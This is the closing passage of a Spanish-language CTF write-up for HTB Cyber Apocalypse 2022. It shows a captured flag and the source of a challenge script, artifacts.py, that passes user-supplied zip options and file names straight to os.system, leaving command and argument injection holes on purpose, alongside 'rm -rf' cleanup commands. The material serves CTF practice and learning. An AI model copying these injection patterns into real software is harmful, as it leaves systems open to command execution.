+-rwxrwxr-x    <span style=color:#ae81ff>1</span> root     root          <span style=color:#ae81ff>3166</span> May <span style=color:#ae81ff>12</span> 23:51 artifacts.py
+-rw-rw-r--    <span style=color:#ae81ff>1</span> root     root           <span style=color:#ae81ff>263</span> May <span style=color:#ae81ff>12</span> 23:32 clear.py
+-rw-rw-r--    <span style=color:#ae81ff>1</span> root     root            <span style=color:#ae81ff>38</span> May <span style=color:#ae81ff>12</span> 17:37 flag.txt
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 22:55 kPeKQsYEx9Z6ZKkBrdtWmQKdS98CURJl
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 22:54 kWHPODHQFKSletaDKHB2AgJslbm6fwbb
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 23:00 tHV1tdX82QcPllglF8wa6AhU24FRZS4S
+drwxr-sr-x    <span style=color:#ae81ff>6</span> ctf      ctf           <span style=color:#ae81ff>4096</span> May <span style=color:#ae81ff>18</span> 22:55 wqVpR4QLSsuu5QiWRqhPNLuYh2aHzlaI
+</code></pre></div><blockquote>
+<p>FLAG: HTB{GTFO_4nd_m4k3_th3_b35t_4rt1f4ct5}</p>
+</blockquote>
+<h4 id=composición>Composición<a hidden class=anchor aria-hidden=true href=#composición>#</a></h4>
+<p>Como parte del ejercicio &ldquo;post-reto&rdquo; se extrajo el código correspondiente al reto (<a href=#artifactspy><code>artifacts.py</code></a> y <a href=#clearpy><code>clear.py</code></a>).</p>
+<h5 id=artifactspy>artifacts.py<a hidden class=anchor aria-hidden=true href=#artifactspy>#</a></h5>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#75715e>#!/usr/bin/python3</span>
+<span style=color:#f92672>import</span> os<span style=color:#f92672>,</span> random
+<span style=color:#f92672>from</span> termcolor <span style=color:#f92672>import</span> colored
+
+
+whitelist <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_.&#39;#/ &#34;</span>
+PATH <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;./&#34;</span>
+sub_array <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;Head&#34;</span>, <span style=color:#e6db74>&#34;Torso&#34;</span>, <span style=color:#e6db74>&#34;Hands&#34;</span>, <span style=color:#e6db74>&#34;Legs&#34;</span>]
+
+<span style=color:#75715e># Create random directory</span>
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>rand_dirname</span>(length<span style=color:#f92672>=</span><span style=color:#ae81ff>32</span>):
+    charset <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>
+    dirname <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>
+    <span style=color:#66d9ef>while</span> len(dirname) <span style=color:#f92672>&lt;</span> length:
+        dirname <span style=color:#f92672>+=</span> random<span style=color:#f92672>.</span>choice(charset)
+    <span style=color:#66d9ef>return</span> dirname
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_filename</span>(filename):
+    <span style=color:#66d9ef>return</span> all(i <span style=color:#f92672>in</span> whitelist <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> filename)
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>change_sub_dir</span>(idx, color):
+  print(colored(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[*] Sub-directory to work in: </span><span style=color:#e6db74>{</span>dirname<span style=color:#e6db74>}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{</span>sub_array[idx]<span style=color:#e6db74>}</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, color))
+  os<span style=color:#f92672>.</span>chdir(PATH <span style=color:#f92672>+</span> sub_array[idx])
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>subjects</span>():
+  subs <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Component List:
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>+===============+
+</span><span style=color:#e6db74>|               |
+</span><span style=color:#e6db74>|  1. Head  🤖  |
+</span><span style=color:#e6db74>|  2. Torso 🦴   |
+</span><span style=color:#e6db74>|  3. Hands 💪  |
+</span><span style=color:#e6db74>|  4. Legs  🦵   |
+</span><span style=color:#e6db74>|               |
+</span><span style=color:#e6db74>+===============+
+</span><span style=color:#e6db74>  &#34;&#34;&#34;</span>
+  print(colored(subs, <span style=color:#e6db74>&#34;magenta&#34;</span>))
+  ans <span style=color:#f92672>=</span> int(input(colored(<span style=color:#e6db74>&#34;[*] Choose component: &#34;</span>, <span style=color:#e6db74>&#34;magenta&#34;</span>)))
+
+  <span style=color:#66d9ef>if</span> ans <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
+    change_sub_dir(<span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;blue&#34;</span>)
+  <span style=color:#66d9ef>elif</span> ans <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>:
+    change_sub_dir(<span style=color:#ae81ff>1</span>, <span style=color:#e6db74>&#34;green&#34;</span>)
+  <span style=color:#66d9ef>elif</span> ans <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span>:
+    change_sub_dir(<span style=color:#ae81ff>2</span>, <span style=color:#e6db74>&#34;cyan&#34;</span>)
+  <span style=color:#66d9ef>elif</span> ans <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:
+    change_sub_dir(<span style=color:#ae81ff>3</span>, <span style=color:#e6db74>&#34;yellow&#34;</span>)
+  <span style=color:#66d9ef>else</span>:
+    print(colored(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[-] Invalid option!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;red&#34;</span>))
+    exit()
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>menu</span>():
+  m <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
+</span><span style=color:#e6db74>Actions:
+</span><span style=color:#e6db74>
+</span><span style=color:#e6db74>1. Create artifact
+</span><span style=color:#e6db74>2. List directory    (pwd; ls -la)
+</span><span style=color:#e6db74>3. Read artifact     (cat ./&lt;name&gt;)
+</span><span style=color:#e6db74>4. Compress artifact (zip &lt;name&gt;.zip &lt;name&gt; &lt;options&gt;)
+</span><span style=color:#e6db74>5. Change directory  (cd &lt;dirname&gt;)
+</span><span style=color:#e6db74>6. Clean directory   (rm -rf ./*)
+</span><span style=color:#e6db74>7. Exit
+</span><span style=color:#e6db74>  &#34;&#34;&#34;</span>
+  print(colored(m, <span style=color:#e6db74>&#34;yellow&#34;</span>))
+  <span style=color:#66d9ef>return</span> int(input(colored(<span style=color:#e6db74>&#34;[*] Choose action: &#34;</span>, <span style=color:#e6db74>&#34;yellow&#34;</span>)))
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>create_file</span>():
+  fname <span style=color:#f92672>=</span> input(colored(<span style=color:#e6db74>&#34;Insert name: &#34;</span>, <span style=color:#e6db74>&#34;yellow&#34;</span>))<span style=color:#f92672>.</span>strip()
+  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> check_filename(fname):
+    print(colored(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[-] Invalid name!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;red&#34;</span>))
+    exit()
+  os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;touch </span><span style=color:#e6db74>{</span>fname<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+  contents <span style=color:#f92672>=</span> input(colored(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>Insert content: &#34;</span>, <span style=color:#e6db74>&#34;yellow&#34;</span>))
+  f <span style=color:#f92672>=</span> open(fname, <span style=color:#e6db74>&#34;a&#34;</span>)
+  f<span style=color:#f92672>.</span>write(contents)
+  f<span style=color:#f92672>.</span>close()
+  print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+  print(colored(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] Artifact [</span><span style=color:#e6db74>{</span>fname<span style=color:#e6db74>}</span><span style=color:#e6db74>] was created successfuly!&#34;</span>, <span style=color:#e6db74>&#34;green&#34;</span>))
+
+<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>zip</span>():
+  zip_name <span style=color:#f92672>=</span> input(colored(<span style=color:#e6db74>&#34;Insert &lt;name&gt;.zip: &#34;</span>, <span style=color:#e6db74>&#34;blue&#34;</span>))<span style=color:#f92672>.</span>strip()
+  files    <span style=color:#f92672>=</span> input(colored(<span style=color:#e6db74>&#34;Insert &lt;name&gt;: &#34;</span>, <span style=color:#e6db74>&#34;blue&#34;</span>))<span style=color:#f92672>.</span>strip()
+  options  <span style=color:#f92672>=</span> input(colored(<span style=color:#e6db74>&#34;Insert &lt;options&gt;: &#34;</span>, <span style=color:#e6db74>&#34;blue&#34;</span>))<span style=color:#f92672>.</span>strip()
+  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> check_filename(zip_name) <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> check_filename(files) <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> check_filename(options):
+    print(colored(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[-] Invalid name!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;red&#34;</span>))
+    exit()
+  os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;zip </span><span style=color:#e6db74>{</span>zip_name<span style=color:#e6db74>}</span><span style=color:#e6db74>.zip </span><span style=color:#e6db74>{</span>files<span style=color:#e6db74>}</span><span style=color:#e6db74> </span><span style=color:#e6db74>{</span>options<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+
+<span style=color:#75715e># Create directory</span>
+dirname <span style=color:#f92672>=</span> rand_dirname()
+print(colored(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[*] Directory to work in: </span><span style=color:#e6db74>{</span>dirname<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;cyan&#34;</span>))
+os<span style=color:#f92672>.</span>mkdir(PATH <span style=color:#f92672>+</span> dirname)
+os<span style=color:#f92672>.</span>chdir(PATH <span style=color:#f92672>+</span> dirname)
+os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;mkdir -p Head Torso Hands Legs&#34;</span>)
+
+ans <span style=color:#f92672>=</span> subjects()
+
+<span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+
+  <span style=color:#75715e># Choose action</span>
+  act <span style=color:#f92672>=</span> menu()
+  print(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>)
+  <span style=color:#66d9ef>if</span> act <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>: 
+    create_file()
+  <span style=color:#66d9ef>elif</span> act <span style=color:#f92672>==</span> <span style=color:#ae81ff>4</span>:
+    zip()
+  <span style=color:#66d9ef>elif</span> act <span style=color:#f92672>==</span> <span style=color:#ae81ff>3</span>: 
+    fname <span style=color:#f92672>=</span> input(<span style=color:#e6db74>&#34;Insert name you want to read: &#34;</span>)<span style=color:#f92672>.</span>strip()
+    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;cat ./</span><span style=color:#e6db74>{</span>fname<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+  <span style=color:#66d9ef>elif</span> act <span style=color:#f92672>==</span> <span style=color:#ae81ff>2</span>: 
+    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;pwd; ls -la&#34;</span>)
+  <span style=color:#66d9ef>elif</span> act <span style=color:#f92672>==</span> <span style=color:#ae81ff>6</span>:
+    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm -rf ./*&#34;</span>)
+  <span style=color:#66d9ef>elif</span> act <span style=color:#f92672>==</span> <span style=color:#ae81ff>5</span>: 
+    os<span style=color:#f92672>.</span>chdir(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;../../</span><span style=color:#e6db74>{</span>dirname<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+    ans <span style=color:#f92672>=</span> subjects()
+  <span style=color:#66d9ef>else</span>:
+    print(colored(<span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>[-] Invalid option!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, <span style=color:#e6db74>&#34;red&#34;</span>))
+    os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#34;rm -rf ./*&#34;</span>)
+    exit()
+</code></pre></div><h5 id=clearpy>clear.py<a hidden class=anchor aria-hidden=true href=#clearpy>#</a></h5>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> os
+
+os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;ls -la &gt; temp&#39;</span>)
+
+f <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#39;temp&#39;</span>, <span style=color:#e6db74>&#39;r&#39;</span>)
+<span style=color:#66d9ef>for</span> line <span style=color:#f92672>in</span> f:
+  arr <span style=color:#f92672>=</span> line<span style=color:#f92672>.</span>split()
+  <span style=color:#66d9ef>try</span>:
+    <span style=color:#66d9ef>if</span> len(arr[<span style=color:#ae81ff>8</span>]) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span>:
+      os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;rm -rf </span><span style=color:#e6db74>{</span>arr[<span style=color:#ae81ff>8</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>) 
+  <span style=color:#66d9ef>except</span>:
+    print(<span style=color:#e6db74>&#39;&#39;</span>)
+
+print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;[+] Directories have been deleted!</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>)
+os<span style=color:#f92672>.</span>system(<span style=color:#e6db74>&#39;rm -f ./temp&#39;</span>)
+</code></pre></div><h1 id=conclusión>Conclusión<a hidden class=anchor aria-hidden=true href=#conclusión>#</a></h1>
+<p>En lo personal encontré el CTF bastante divertido y me permitió explorar cosas que hasta el momento no había podido tocar como lo fueron los retos de forense, enfocados más al lado de Blue Team. Como ejercicio para práctica futura y de aprendizaje guardé los retos y sus archivos en <a href=https://github.com/srrequiem/CTF-Challenge-Compilation>este repositorio</a> para poder resolverlos siguiendo los write-ups públicos y aprender de ellos.</p>
+</div>
+<footer class=post-footer>
+<ul class=post-tags>
+<li><a href=https://rzul.me/tags/ctf/>CTF</a></li>
+<li><a href=https://rzul.me/tags/xss/>XSS</a></li>
+<li><a href=https://rzul.me/tags/jwt/>JWT</a></li>
+<li><a href=https://rzul.me/tags/md-to-pdf/>md-to-pdf</a></li>
+<li><a href=https://rzul.me/tags/ida/>IDA</a></li>
+<li><a href=https://rzul.me/tags/evtx/>evtx</a></li>
+<li><a href=https://rzul.me/tags/ntuser.dat/>NTUSER.dat</a></li>
+<li><a href=https://rzul.me/tags/zip/>zip</a></li>
+<li><a href=https://rzul.me/tags/gtfobins/>GTFOBins</a></li>
+</ul>
+<nav class=paginav>
+<a class=next href=https://rzul.me/posts/htb-active/>
+<span class=title>Siguiente »</span>
+<br>
+<span>Hack The Box - Active</span>
+</a>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB Cyber Apocalypse 2022 on twitter" href="https://twitter.com/intent/tweet/?text=HTB%20Cyber%20Apocalypse%202022&url=https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f&hashtags=CTF%2cXSS%2cJWT%2cmd-to-pdf%2cIDA%2cevtx%2cNTUSER.dat%2czip%2cGTFOBins"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB Cyber Apocalypse 2022 on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f&title=HTB%20Cyber%20Apocalypse%202022&summary=HTB%20Cyber%20Apocalypse%202022&source=https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB Cyber Apocalypse 2022 on reddit" href="https://reddit.com/submit?url=https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f&title=HTB%20Cyber%20Apocalypse%202022"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB Cyber Apocalypse 2022 on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB Cyber Apocalypse 2022 on whatsapp" href="https://api.whatsapp.com/send?text=HTB%20Cyber%20Apocalypse%202022%20-%20https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share HTB Cyber Apocalypse 2022 on telegram" href="https://telegram.me/share/url?text=HTB%20Cyber%20Apocalypse%202022&url=https%3a%2f%2frzul.me%2fposts%2fhtb-cyber-apocalypse-2022%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
+</div>
+</footer>
+</article>
+</main>
+<footer class=footer>
+<span>&copy; 2022 <a href=https://rzul.me/>Román Zuleta</a></span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+</body>
+</html>
